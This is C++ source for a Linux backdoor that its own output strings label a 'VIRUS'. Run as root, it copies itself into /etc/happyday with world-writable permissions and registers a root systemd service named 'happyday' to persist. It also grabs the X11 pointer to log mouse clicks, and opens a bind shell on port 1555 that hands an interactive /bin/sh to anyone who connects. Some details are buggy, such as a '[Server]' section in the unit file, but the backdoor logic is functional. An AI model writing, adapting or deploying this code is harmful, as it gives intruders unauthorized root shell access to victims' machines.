#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string>
#include <vector>
#include <X11/Xlib.h>
#include <unistd.h>
#include <fstream>
#include <thread>
#include <cstdlib>
#include <linux/limits.h>

char *key_name[] = {
    "first",
    "second (or middle)",
    "third",
    "fourth",  // :D
    "fivth"    // :|
};

std::string getFullPath(){
    try{
        char args1[20];
        char exepath[PATH_MAX + 1];
        sprintf(args1, "/proc/%d/exe", getpid());
        readlink(args1, exepath, 1024);
        return std::string(exepath);
    } catch(int e){
        return "";
    }
}

bool copyfile(std::string filename, std::string destfile){
    try{
        std::ifstream  src(filename.c_str(), std::ios::binary);
        std::ofstream  dst(destfile.c_str(), std::ios::binary);
        dst << src.rdbuf();
        src.close();
        dst.close();
        std::cout << "\033[1;32m[*] COPYED FILE: " << filename << "\033[0m" << std::endl;
        return true;
    } catch(int a){
        std::cout << "\033[1;31m[-] FAILED TO COPY FILE\033[0m" << std::endl;
        return false;
    }
}

bool service_maker(){
    try{
        std::ofstream service("happyday.service");
        std::vector<std::string> service_file_format = {
            "[Unit]",
            "Description=Happy Day",
            "After=multi-user.target",
            "",
            "[Server]",
            "Type=simple",
            "WorkingDirectory=/etc/happyday",
            "ExecStart=./etc/happyday/start",
            "User=root",
            "Restart=on-failure",
            "",
            "[Install]",
            "WantedBy=multi-user.target"
        };
        for (int i = 0; i < service_file_format.size(); i++)
        {
            std::string a(service_file_format[i]);
            service << a.c_str() << std::endl;
        }
        service.close();
        std::cout << "\033[1;32m[*] CREATED SERVICE FILE\033[0m" << std::endl;
        return true;
    } catch(int a) {
        std::cout << "\033[31m[-] FAILED TO CREATE SERVICE FILE\033[0m" << std::endl;
        return false;
    }
}

bool checkprivs(){
    auto me = getuid();
    if(me == 0){
        std::cout << "\033[1;32m[*] RUNNING AS ROOT\033[1;0m" << std::endl;
        return true;
    }
    else {
        std::cout << "\033[1;31m[-] NOT RUNNING AS ROOT\033[0m" << std::endl;
        return false;
    }
}

void payload_listener(){
    Display *display;
    XEvent xevent;
    Window window;

    if( (display = XOpenDisplay(NULL)) == NULL )
        exit(EXIT_FAILURE);

    window = DefaultRootWindow(display);
    XAllowEvents(display, AsyncBoth, CurrentTime);
    XGrabPointer(display, window, 1, PointerMotionMask | ButtonPressMask | ButtonReleaseMask , GrabModeAsync, GrabModeAsync, None, None, CurrentTime);

    while(1) {
        XNextEvent(display, &xevent);
        switch (xevent.type) {
            case ButtonPress:
                std::cout << "\033[1;32m[*] USER CLICKED THE MOUSE\033[1;0m" << std::endl;
                break;
        }
    }
    exit(EXIT_SUCCESS);
}

int start_shell (int s)
{
    char *name[3];

    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
  
    name[0] = "/bin/sh";
    name[1] = "-i";
    name[2] = NULL;
    execv(name[0], name);
    exit(1);

    return 0;
}

int server_init(int port){
    int s, s1;
    socklen_t clen;
    struct sockaddr_in serv, client;
    if((s = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("socket:");
        exit(EXIT_FAILURE);
    }
    serv.sin_family = AF_INET;
    serv.sin_port = htons(port);
    serv.sin_addr.s_addr = htonl(INADDR_ANY);
    if ((bind (s, (struct sockaddr *)&serv, sizeof(struct sockaddr_in))) < 0)
    {
        perror("bind:");
        exit(EXIT_FAILURE);
    }
    if ((listen (s, 10)) < 0)
    {
        perror("listen:");
        exit(EXIT_FAILURE);
    }
    clen = sizeof(struct sockaddr_in);
    if ((s1 = accept (s, (struct sockaddr *) &client, &clen)) < 0)
    {
        perror("accept:");
        exit(EXIT_FAILURE);
    }
    return s1;
}

bool installfiles(std::string exe){
    try{
        system("sudo mkdir /etc/happyday");
        copyfile(exe, "/etc/happyday/start");
        system("sudo chmod 777 /etc/happyday/start");
        copyfile("happyday.service", "/etc/systemd/system/happyday.service");
        system("sudo systemctl enable happyday");
        system("rm happyday.service");
        std::cout << "\033[1;32m[*] INSTALLED VIRUS\033[0m" << std::endl;
        return true;
    } catch(int a){
        std::cout << "\033[1;31m[-] UNABLE TO INSTALL VIRUS\033[0m" << std::endl;
        return false;
    }
}

bool file_exist(std::string filepath){
    if(access(filepath.c_str(), 0) == -1){
        return false;
    }
    else {
        return true;
    }
}

int main(int argc, char * argv[]){
    if(checkprivs()){
        std::string path = getFullPath();
        std::string pathfile(path.substr(0, path.size()));
        if(pathfile == ""){
            std::cout << "\033[1;31m[-] FAILED TO GET FILE PATH\033[0m" << std::endl;
        } else {
            std::cout << "\033[1;32m[*] GOT FILE PATH: " << pathfile << "\033[0m" << std::endl;
            if(service_maker()){
                if(file_exist("/etc/happyday/start") != true){
                    std::cout << "\033[1;32m[*] INSTALLING VIRUS\033[0m" << std::endl;
                    installfiles(pathfile);
                }
                else{
                    std::cout << "\033[1;32m[*] STARTING PAYLOAD\033[0m" << std::endl;
                    std::thread thread(payload_listener);
                    start_shell(server_init(1555));
                }
            }
        }
    }
    return 0;
}